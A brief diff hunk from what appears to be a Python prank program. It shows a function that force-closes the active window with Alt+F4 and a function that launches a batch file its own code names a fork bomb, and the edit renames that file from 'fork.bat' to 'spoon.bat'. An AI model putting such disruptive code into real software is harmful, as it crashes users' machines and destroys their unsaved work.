@@ -238,7 +238,7 @@ def htijwbtlgio():
     pag.hotkey("alt", "f4")
 
 def fork_yourself():
-    fork_bomb = "fork.bat"
+    fork_bomb = "spoon.bat"
     subprocess.Popen(fork_bomb)
 
 # Dictionary of possible outcomes for the random_function() function. Second value is weight, higher = more likely
